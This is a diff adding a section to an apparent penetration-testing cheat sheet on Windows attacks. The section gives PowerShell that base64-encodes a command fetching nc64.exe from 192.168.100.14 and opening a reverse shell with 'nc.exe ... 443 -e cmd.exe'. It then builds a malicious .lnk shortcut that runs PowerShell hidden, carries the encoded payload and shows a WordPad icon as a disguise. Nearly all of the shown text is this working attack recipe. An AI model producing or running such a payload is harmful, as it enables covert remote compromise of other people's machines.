@@ -69,6 +69,28 @@ Invoke-Command -ComputerName hitman-dc -Credential $cred -ScriptBlock {
 }
 ```
 
+&nbsp;
+
+**[+] Create a shortcut link shell (.lnk)**
+
+```powershell
+// Command to base64
+
+$command = 'invoke-webrequest http://192.168.100.14/nc64.exe -OutFile c:\users\public\nc.exe; c:\users\public\nc.exe 192.168.100.14 443 -e cmd.exe'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+// Create shortcut link, don't forget to change the encoded command
+
+$obj = New-object -comobject wscript.shell
+$link = $obj.createshortcut("c:\users\public\hit.lnk")
+$link.windowstyle = "7"
+$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
+$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand "aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgAxADQALwBuAGMANgA0AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABjADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAG4AYwAuAGUAeABlADsAIABjADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAG4AYwAuAGUAeABlACAAMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMQA0ACAANAA0ADMAIAAtAGUAIABjAG0AZAAuAGUAeABlAA=="
+$link.save()
+```
+
 
 &nbsp;
 &nbsp;
